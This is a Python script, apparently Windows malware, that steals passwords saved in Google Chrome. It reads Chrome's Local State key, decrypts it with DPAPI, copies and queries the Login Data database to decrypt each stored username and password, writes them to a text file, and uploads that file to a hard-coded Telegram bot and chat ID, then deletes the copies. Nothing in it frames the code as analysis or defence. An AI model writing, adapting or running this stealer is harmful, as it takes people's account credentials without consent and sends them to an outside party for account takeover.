import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests

def encryption_key():
    local_state_yolu = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_yolu, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def send_telegram_document(bot_token, chat_id, document_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {'document': open(document_path, 'rb')}
    params = {
        "chat_id": chat_id,
    }
    try:
        response = requests.post(url, params=params, files=files)
    except:
        pass


def main():
    key = encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    credentials = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            credentials.append({
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": password
            })

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    if credentials:
        bot_token = "6354863780:AAGM30NGB191vQp5bgz0-eWjR4mEYuBG104"
        chat_id = "6400505528"
        document_path = "credentials.txt"

        with open(document_path, "w") as file:
            json.dump(credentials, file, indent=4)

        send_telegram_document(bot_token, chat_id, document_path)
        os.remove(document_path)


if __name__ == "__main__":
    main()
